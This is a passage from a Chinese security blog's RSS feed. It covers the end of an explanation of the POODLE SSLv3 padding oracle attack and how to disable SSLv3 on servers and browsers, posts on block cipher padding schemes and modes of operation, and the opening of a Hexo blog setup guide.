alt="img"></p><p>然后不断调整前一块（MAC数据）对应密文位置的值，直到通过解密校验，根据SSL的漏洞，此时最后一块最后一个值必然为0x07：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/be0160296022f639c6aa6c25b3917167.jpeg" alt="img"></p><p>这里例子举得不好，0x07密文也是0x07，后面用0x07明、0x07密来区分，此时我们假设未知加密函数为f(x)，其逆为g(y)，那么根据CBC解密流程，有：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token number">0x07</span>明 <span class="token operator">=</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密<span class="token punctuation">)</span> ⊕  <span class="token number">0x01</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x06</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在要求：（此时要注意不是拿0x6E ⊕ g(0x07密）,因为如果解密第四块，应该是第三块 最后一字符⊕g(0x07密））</p><pre class="line-numbers language-c"><code class="language-c">x <span class="token operator">=</span> <span class="token number">0x6E</span> ⊕ <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此x = 0x68，即字符”h”，得到解密明文”h”。</p><p>同理，通过控制请求路径，例如GET /a、GET /aa，不断地把已经解密的Cookie字符挤出，把未知字符留在该块末尾，然后循环进行前述操作，即可得到完整的Cookie字段。</p><h2 id="3-3-Padding验证和MAC验证返回结果不同的情况"><a href="#3-3-Padding验证和MAC验证返回结果不同的情况" class="headerlink" title="3.3 Padding验证和MAC验证返回结果不同的情况"></a><strong>3.3 Padding验证和MAC验证返回结果不同的情况</strong></h2><p>前面的操作都是建立在Padding验证和MAC验证返回结果不同的基础之上，如果返回结果相同，那么MAC会校验不过导致失去判断Padding验证成功的依据。此时攻击者需要利用响应时间的差异来进行判断。如果响应时间仍然相同，那么这种攻击就无效了。</p><h2 id="3-4-POODLE中“降级”的体现"><a href="#3-4-POODLE中“降级”的体现" class="headerlink" title="3**.4 POODLE中“降级”的体现**"></a>3**.4 POODLE中“降级”的体现**</h2><p>POODLE只在SSLv3.0以下版本才容易攻击成功，TLS会检查填充字符，所以TLS构造的padding通过服务器验证概率极低，TLSv1.3以后则完全避免了该漏洞。2014年，TLS已经得到广泛应用，但不乏少数服务器、客户端（比如IE6）和中间网络设备仍然采用SSL协议。因此为了平滑过渡增加用户体验，TLS1.2、TLS1.1、TLS1.0协议实现都会向后兼容SSLv3.0协议，最终协商通信协议为服务端和客户端支持的最高版本协议。如果记录协议中采用的是RC4流加密或者CBC模式的块加密，那么攻击者就可以进行POODLE攻击。</p><h1 id="4-解决方法"><a href="#4-解决方法" class="headerlink" title="4 解决方法"></a>4 解决方法</h1><p>禁用SSL 3.0协议(ssl version ssl3.0 disable)。</p><h2 id="4-1-服务端禁用方法"><a href="#4-1-服务端禁用方法" class="headerlink" title="4.1 服务端禁用方法"></a>4.1 服务端禁用方法</h2><p><strong>（1）Apache 2.x:</strong><br>在mod_ssl配置文件中使用如下命令禁用SSLv2和SSLv3：<br>SSLProtocol All -SSLv2 -SSLv3<br>重启Apache</p><p><strong>（2）Nginx:</strong><br>在配置文件中使用：<br>ssl_protocols TLSv1 TLSv1.1 TLSv1.2;<br>重启Nginx</p><p><strong>（3）lighttpd：</strong><br>确认lighttpd为1.4.29及以上版本<br>在配置文件中使用<br>ssl.use-sslv3 = “disable”<br>重启lighttpd</p><p><strong>（4）tomcat参考:</strong></p><pre><code>https://tomcat.apache.org/tomcat-6.0-doc/ssl-howto.html</code></pre><p><a href="https://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html">https://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html</a></p><p><strong>（5）IIS:</strong><br>查找如下注册表项：<br>HKey_Local_MachineSystemCurrentControlSetControlSecurityProviders SCHANNELProtocols<br>该注册表项通常包含以下子项：</p><ul><li>PCT 1.0</li><li>SSL 2.0</li><li>SSL 3.0</li><li>TLS 1.0<br>每个注册表项都保留适用于该项的协议相关信息。可以在服务器上禁用这些协议中的任一种。为此，</li></ul><p>请在协议SSL 3.0的服务器子项中创建一个新的DWORD值。名称为Enabled,将DWORD值设置为“00 00 00 00”。 重启IIS服务</p><h2 id="4-2-浏览器禁用方法"><a href="#4-2-浏览器禁用方法" class="headerlink" title="4.2 浏览器禁用方法"></a>4.2 浏览器禁用方法</h2><p><strong>（1）IE:</strong><br>“工具” -&gt; “Internet 选项” -&gt; “高级” ，取消”使用 SSL 3.0”的复选框。<br><strong>（2）Chrome:</strong></p><p>复制一个平时打开 Chrome 浏览器的快捷方式，在新的快捷方式上右键点击，进入属性，<br>在”目标”后面的空格中字段的末尾输入以下命令 –ssl-version-min=tls1<br><strong>（3）FireFox:</strong></p><p>在地址栏输入”about:config”，然后将 security.tls.version.min 调至 1。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>1、<a href="https://www.jianshu.com/p/ad8bdd87e131">《Web狗要懂的Padding Oracle攻击》</a>：很详细</p><p>2、<a href="https://www.jianshu.com/p/1851f778e579">《Padding Oracle》</a></p><p>3、[《百度百科：Padding Oracle》](<a href="https://baike.baidu.com/item/Padding">https://baike.baidu.com/item/Padding</a> Oracle/3530091?fr=aladdin)</p><p>4、<a href="https://baike.baidu.com/item/ASCII/309296?fr=aladdin">《ASCII表》</a>和<a href="https://www.23bei.com/tool-531.html">在线异或计算器</a>：便于实验</p><p>5、<a href="https://www.cnblogs.com/xzjf/p/8251651.html">《HTTPS 协议降级攻击原理》</a>：对攻击原理理解透彻</p><p>6、<a href="http://www.vuln.cn/6135">《CVE-2014-3566 SSLv3 POODLE原理分析 – insight-labs》</a>：有些许理解错误，注意辨别</p><p>7、<a href="https://www.imperialviolet.org/2014/10/14/poodle.html">《POODLE attacks on SSLv3 (14 Oct 2014)》</a>：英文原文例子</p><p>8、<a href="https://blog.csdn.net/howeverpf/article/details/40350113">《漏洞分析—SSLv3降级加密协议Padding Oracle攻击（POODLE）技术分析》</a>：例子详细</p><p>9、<a href="http://www.bubuko.com/infodetail-413104.html">《SSLv3 POODLE 攻击分析》</a>：最正确的一篇分析</p><p>10、<a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">《This POODLE Bites: Exploiting The SSL 3.0 Fallback》</a>：Google研究报告原文</p><p>11  <a href="https://www.onebug.org/%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E5%BA%93/87280.html">https://www.onebug.org/%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E5%BA%93/87280.html</a> ：预防办法</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/09/01/htps-attack-paddingoracle/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>分组密码--填充模式</title>
      <link>https://m01ly.github.io/2020/08/31/blockcipher-padding/</link>
      <guid>https://m01ly.github.io/2020/08/31/blockcipher-padding/</guid>
      <pubDate>Mon, 31 Aug 2020 08:51:03 GMT</pubDate>
      
      <description>&lt;p&gt;转载自 &lt;a href=&quot;https://www.jianshu.com/p/16e1cbc0b7a9&quot;&gt;https://www.jianshu.com/p/16e1cbc0b7a9&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;填充模式不仅仅适用于对称密码，非对称密码也会用到，比如RSA&lt;/p&gt;
&lt;p&gt;分组密码中，需要将明文按指定大小进行分组，由于明文并非指定大小的整数倍，因此在明文的最后一个分组需要将其填充至加密算法所要求的分组大小后进行加密。&lt;/p&gt;
&lt;p&gt;在解密时，按照同样的填充模式将填充的数据去除。&lt;/p&gt;
&lt;p&gt;斜体表示 SunJCE 支持，非斜体为 BouncyCastle 支持&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载自 <a href="https://www.jianshu.com/p/16e1cbc0b7a9">https://www.jianshu.com/p/16e1cbc0b7a9</a> </p><p>填充模式不仅仅适用于对称密码，非对称密码也会用到，比如RSA</p><p>分组密码中，需要将明文按指定大小进行分组，由于明文并非指定大小的整数倍，因此在明文的最后一个分组需要将其填充至加密算法所要求的分组大小后进行加密。</p><p>在解密时，按照同样的填充模式将填充的数据去除。</p><p>斜体表示 SunJCE 支持，非斜体为 BouncyCastle 支持</p><a id="more"></a><h3 id="NOPADDING"><a href="#NOPADDING" class="headerlink" title="NOPADDING"></a><em>NOPADDING</em></h3><p>不填充，在此填充下原始数据必须是分组大小的整数倍，非整数倍时无法使用该模式</p><h3 id="PKCS5PADDING，PKCS7PADDING"><a href="#PKCS5PADDING，PKCS7PADDING" class="headerlink" title="PKCS5PADDING，PKCS7PADDING"></a><em>PKCS5PADDING</em>，PKCS7PADDING</h3><p>填充至符合块大小的整数倍，填充值为填充数量数</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</code></li></ul><p><code>PKCS5PADDING</code> 的块大小应为 8 个字节，而 <code>PKCS7PADDING</code> 的块大小可以在 1~255 的范围内。但 SunJCE 的 Provider 实现中 <code>PKCS5PADDING</code> 也按 <code>PKCS7PADDING</code> 来进行处理了。</p><h3 id="ISO10126PADDING"><a href="#ISO10126PADDING" class="headerlink" title="ISO10126PADDING"></a>ISO10126PADDING</h3><p>填充至符合块大小的整数倍，填充值最后一个字节为填充的数量数，其他字节随机处理</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 3F 7A B4 09 14 36 07</code></li></ul><h3 id="ISO7816-4PADDING"><a href="#ISO7816-4PADDING" class="headerlink" title="ISO7816-4PADDING"></a>ISO7816-4PADDING</h3><p>填充至符合块大小的整数倍，填充值第一个字节为 0x80，其他字节填 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 80 00 00 00 00 00 00</code></li></ul><h3 id="ZEROBYTEPADDING"><a href="#ZEROBYTEPADDING" class="headerlink" title="ZEROBYTEPADDING"></a>ZEROBYTEPADDING</h3><p>填充至符合块大小的整数倍，填充值为 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</code></li></ul><h3 id="X923PADDING"><a href="#X923PADDING" class="headerlink" title="X923PADDING"></a>X923PADDING</h3><p>填充至符合块大小的整数倍，填充值最后一个字节为填充的数量数，其他字节填 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</code></li></ul><h3 id="TBCPADDING（Trailing-Bit-Compliment）"><a href="#TBCPADDING（Trailing-Bit-Compliment）" class="headerlink" title="TBCPADDING（Trailing-Bit-Compliment）"></a>TBCPADDING（Trailing-Bit-Compliment）</h3><p>填充至符合块大小的整数倍，原文最后一位为“1”时填充 0x00，最后一位为“0”时填充“0xFF”</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</code></li><li>原始：<code>FF FF FF FF FF FF FF FF F0</code></li><li>填充：<code>FF FF FF FF FF FF FF FF F0 FF FF FF FF FF FF FF</code></li></ul><h3 id="PKCS1PADDING"><a href="#PKCS1PADDING" class="headerlink" title="PKCS1PADDING"></a><em>PKCS1PADDING</em></h3><p>该填充模式是 RSA 加密中使用的，详见 <a href="https://tools.ietf.org/html/rfc2313">RFC 2313</a>。RSA 加密时，需要将原文填充至密钥大小，填充的格式为：</p><pre><code>00 + BT + PS + 00 + D</code></pre><ul><li><code>00</code> 为固定字节</li><li><code>BT</code> 为处理模式。公钥操作时为 <code>02</code>，私钥操作为 <code>00</code> 或 <code>01</code></li><li><code>PS</code> 为填充字节，填充数量为 <code>k - 3 - D</code>，<code>k</code> 表示密钥长度，<code>D</code> 表示原文长度。<code>PS</code> 的最小长度为 8 个字节。填充的值根据 <code>BT</code> 值不同而不同： <ul><li><code>BT = 00</code> 时，填充全 <code>00</code></li><li><code>BT = 01</code> 时，填充全 <code>FF</code></li><li><code>BT = 02</code> 时，随机填充，但不能为 <code>00</code></li></ul></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</category>
      
      
      <comments>https://m01ly.github.io/2020/08/31/blockcipher-padding/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>分组密码--工作模式</title>
      <link>https://m01ly.github.io/2020/08/31/blockcipher-operation-mode/</link>
      <guid>https://m01ly.github.io/2020/08/31/blockcipher-operation-mode/</guid>
      <pubDate>Mon, 31 Aug 2020 08:50:11 GMT</pubDate>
      
      <description>&lt;p&gt;转载wiki&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载wiki</p><a id="more"></a><h2 id="1-前期知识"><a href="#1-前期知识" class="headerlink" title="1 前期知识"></a>1 前期知识</h2><p>分组密码算法</p><h2 id="2-工作模式"><a href="#2-工作模式" class="headerlink" title="2 工作模式"></a>2 工作模式</h2><p>我们知道分组密码属于对称密码算法，但是每次只能处理特定长度的一块数据的算法，每块都是一个分组，分组的比特数就称为分组长度。因此针对加密的内容超过分组密码的分组长度时，该如何安全加密呢？这时候就需要工作模式来解决这个问题， 分组密码工作模式描述了如何重复加密比较长的多个数据块，工作模式中会用到加密算法，加密算法只是工作模式中的一环节，这里要区分开。</p><p> 常见的分组加密算法有: DES、3DES、AES、IDEA 。</p><p><strong>常见分组密码算法分组长度和密钥长度如下表:</strong></p><table><thead><tr><th>密码算法</th><th>分组长度</th><th>密钥长度</th></tr></thead><tbody><tr><td>DES</td><td>64 bit/8 byte</td><td>64(56+8) bit/8 byte</td></tr><tr><td>3DES</td><td>64 bit/8 byte</td><td>64/64*2/64 * 3 bit</td></tr><tr><td>AES</td><td>128 bit/16 byte</td><td>128/192/256 bit</td></tr></tbody></table><p>经典的工作模式有以下5种。</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598927024511.png" alt="1598927024511"></p><p> <img src="https://img-blog.csdnimg.cn/20200412155237387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9xaWFvbGl1c2h1aUND,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><h3 id="2-1-电子密码本（ECB）"><a href="#2-1-电子密码本（ECB）" class="headerlink" title="2.1 电子密码本（ECB）"></a>2.1 电子密码本（ECB）</h3><p>最简单的加密模式即为<strong>电子密码本</strong>（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</p><p><a href="https://zh.wikipedia.org/wiki/File:Ecb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c4/Ecb_encryption.png" alt="Ecb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ecb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/6/66/Ecb_decryption.png" alt="Ecb decryption.png"></a></p><p>本方法的缺点在于同样的明文块会被加密成相同的密文块；因此，它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。下面的例子显示了ECB在密文中显示明文的模式的程度：该图像的一个位图版本（左图）通过ECB模式可能会被加密成中图，而非ECB模式通常会将其加密成右图。</p><table><thead><tr><th><a href="https://zh.wikipedia.org/wiki/File:Tux.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg" alt="Tux.jpg"></a></th><th><a href="https://zh.wikipedia.org/wiki/File:Tux_ecb.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Tux_ecb.jpg" alt="Tux ecb.jpg"></a></th><th><a href="https://zh.wikipedia.org/wiki/File:Tux_secure.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a0/Tux_secure.jpg" alt="Tux secure.jpg"></a></th></tr></thead><tbody><tr><td>原图</td><td>使用ECB模式加密</td><td>提供了伪随机性的非ECB模式</td></tr></tbody></table><p>右图是使用CBC，CTR或任何其它的更安全的模式加密左图可能产生的结果——与随机噪声无异。注意右图看起来的随机性并不能表示图像已经被安全的加密；许多不安全的加密法也可能产生这种“随机的”输出。</p><p>ECB模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用ECB模式的Blowfish密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。</p><h3 id="2-2-密码块链接（CBC）"><a href="#2-2-密码块链接（CBC）" class="headerlink" title="2.2 密码块链接（CBC）"></a>2.2 密码块链接（CBC）</h3><p>1976年，IBM发明了<strong>密码分组链接</strong>（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><p><a href="https://zh.wikipedia.org/wiki/File:Cbc_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png" alt="Cbc encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Cbc_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/6/66/Cbc_decryption.png" alt="Cbc decryption.png"></a></p><p>若第一个块的下标为1，则CBC模式的加密过程为</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926624504.png" alt="1598926624504"></p><p>而其解密过程则为</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926632436.png" alt="1598926632436"></p><p>CBC是最为常用的工作模式。它的主要缺点在于<strong>加密过程是串行</strong>的，无法被并行化，而且消息必须被填充到块大小的整数倍。解决后一个问题的一种方法是利用密文窃取。</p><p>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，<strong>解密过程可以被并行化</strong>，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p><h3 id="2-3-填充密码块链接（PCBC）"><a href="#2-3-填充密码块链接（PCBC）" class="headerlink" title="2.3 填充密码块链接（PCBC）"></a>2.3 填充密码块链接（PCBC）</h3><p><strong>填充密码块链接</strong>（<strong>PCBC</strong>，Propagating cipher-block chaining）或称为<strong>明文密码块链接</strong>（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。</p><p><a href="https://zh.wikipedia.org/wiki/File:Pcbc_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Pcbc_encryption.png" alt="Pcbc encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Pcbc_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Pcbc_decryption.png" alt="Pcbc decryption.png"></a></p><p>加密和解密算法如下：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926657325.png" alt="1598926657325"></p><p>PCBC主要用于Kerberos v4和WASTE中，而在其它场合的应用较少。对于使用PCBC加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5没有使用PCBC。</p><h3 id="2-4-密文反馈（CFB）"><a href="#2-4-密文反馈（CFB）" class="headerlink" title="2.4 密文反馈（CFB）"></a>2.4 密文反馈（CFB）</h3><p><strong>密文反馈</strong>（CFB，Cipher feedback）模式类似于CBC，可以将块密码变为自同步的<a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E5%AF%86%E7%A0%81">流密码</a>；工作过程亦非常相似，CFB的解密过程几乎就是颠倒的CBC的加密过程：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926692468.png" alt="1598926692468"></p><p><a href="https://zh.wikipedia.org/wiki/File:Cfb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Cfb_encryption.png" alt="Cfb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Cfb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/7/75/Cfb_decryption.png" alt="Cfb decryption.png"></a></p><p>上述公式是描述的是最简单的CFB，在这种模式下，它的自同步特性仅仅与CBC相同，即若密文的一整块发生错误，CBC和CFB都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用CFB的自同步性。</p><p>为了利用CFB制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用IV将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高<em>x</em>位与明文的<em>x</em>进行异或，以产生密文的<em>x</em>位。下一步将生成的<em>x</em>位密文移入寄存器中，并对下面的<em>x</em>位明文重复这一过程。解密过程与加密过程相似，以IV开始，对寄存器加密，将结果的高<em>x</em>与密文异或，产生<em>x</em>位明文，再将密文的下面<em>x</em>位移入寄存器。</p><p>下式中Si是移位寄存器的第<em>i</em>个状态，a &lt;&lt; x是指将<em>a</em>移位<em>x</em>位，head(a, x)是指<em>a</em>的高<em>x</em>位，<em>n</em>则是指IV的位数。</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926716035.png" alt="1598926716035"></p><p>若密文的<em>x</em>位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。</p><p>与CBC相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与CBC类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。</p><p>CFB拥有一些CBC所不具备的特性，这些特性与OFB和CTR的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。</p><h3 id="2-5-输出反馈（OFB）"><a href="#2-5-输出反馈（OFB）" class="headerlink" title="2.5 输出反馈（OFB）"></a>2.5 输出反馈（OFB）</h3><p><strong>输出反馈</strong>模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。</p><p>由于XOR操作的对称性，加密和解密操作是完全相同的：</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926747469.png" alt="1598926747469"></p><p><a href="https://zh.wikipedia.org/wiki/File:Ofb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Ofb_encryption.png" alt="Ofb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ofb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Ofb_decryption.png" alt="Ofb decryption.png"></a></p><p>每个使用OFB的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对IV进行加密，最后并行的将明文或密文进行并行的异或处理。</p><p>可以利用输入全0的CBC模式产生OFB模式的密钥流。这种方法十分实用，因为可以利用快速的CBC硬件实现来加速OFB模式的加密过程。</p><h3 id="2-6计数器模式（CTR）"><a href="#2-6计数器模式（CTR）" class="headerlink" title="2.6计数器模式（CTR）"></a>2.6计数器模式（CTR）</h3><p>与OFB相似，CTR将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非CTR模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。</p><p>CTR模式的特征类似于OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR适合运用于多处理器的硬件上。</p><p>注意图中的“nonce”与其它图中的IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。</p><p><a href="https://zh.wikipedia.org/wiki/File:Ctr_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Ctr_encryption.png" alt="Ctr encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ctr_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/3/34/Ctr_decryption.png" alt="Ctr decryption.png"></a></p><p>参考文献：</p><p> <a href="https://blog.csdn.net/xiaoqiaoliushuiCC/article/details/105470567">https://blog.csdn.net/xiaoqiaoliushuiCC/article/details/105470567</a> </p><p><a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F</a> </p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</category>
      
      
      <comments>https://m01ly.github.io/2020/08/31/blockcipher-operation-mode/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hexo踩坑</title>
      <link>https://m01ly.github.io/2020/08/26/hexo-guide/</link>
      <guid>https://m01ly.github.io/2020/08/26/hexo-guide/</guid>
      <pubDate>Wed, 26 Aug 2020 09:33:07 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;0-引言&quot;&gt;&lt;a href=&quot;#0-引言&quot; class=&quot;headerlink&quot; title=&quot;0 引言&quot;&gt;&lt;/a&gt;0 引言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://hexo.io/zh-cn/docs/tag-plugins&quot;&gt;hexo官方指南&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/6844903777321877511&quot;&gt;hexo 命令大全&lt;/a&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://moxfive.xyz/yelee/&quot;&gt;yelee主题官方使用指南&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本博客搭建教程：&lt;a href=&quot;https://blog.csdn.net/qq_36759224/article/details/82121420?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&quot;&gt;使用 Github Pages 和 Hexo 搭建自己的独立博客【超级详细的小白教程】&lt;/a&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0-引言"><a href="#0-引言" class="headerlink" title="0 引言"></a>0 引言</h1><p><a href="https://hexo.io/zh-cn/docs/tag-plugins">hexo官方指南</a> </p><p><a href="https://juejin.cn/post/6844903777321877511">hexo 命令大全</a>：</p><p><a href="http://moxfive.xyz/yelee/">yelee主题官方使用指南</a></p><p>本博客搭建教程：<a href="https://blog.csdn.net/qq_36759224/article/details/82121420?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.edu_weight">使用 Github Pages 和 Hexo 搭建自己的独立博客【超级详细的小白教程】</a></p><a id="more"></a><h1 id="1-插入图片"><a href="#1-插入图片" class="headerlink" title="1 插入图片"></a>1 插入图片</h1><p>参考：<a href="https://www.dazhuanlan.com/2019/12/18/5df99e24d6d27/">Hexo 无法加载图片（路径问题）</a></p><p><a href="https://www.jianshu.com/p/7f06d10f2e3e">关于hexo博客图片插件问题</a></p><p><a href="https://www.jianshu.com/p/db02d775aed0">在hexo博客添加图片遇到的坑</a></p><h2 id="1-1-配置文件"><a href="#1-1-配置文件" class="headerlink" title="1.1  配置文件"></a>1.1  配置文件</h2><blockquote><p>根目录配置_config.yml里面的post_asset_folder:false这个选项设置为true。Hexo 提供了一种更方便管理 Asset 的设定：post_asset_folder</p><pre><code>post_asset_folder: true</code></pre></blockquote><h2 id="1-2-安装图片插件"><a href="#1-2-安装图片插件" class="headerlink" title="1.2 安装图片插件"></a>1.2 安装图片插件</h2><p>先卸载 hexo-asset-image: npm uninstall hexo-asset-image</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> https://github.com/CodeFalling/hexo-asset-image --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/hexo-guide/1603260802378.png" alt="1603260802378"></p><p>图片居中</p><pre><code>&lt;style&gt;img &#123;  position:relative;  width:60%;  left:15%;/*left为（img父元素元素的width - 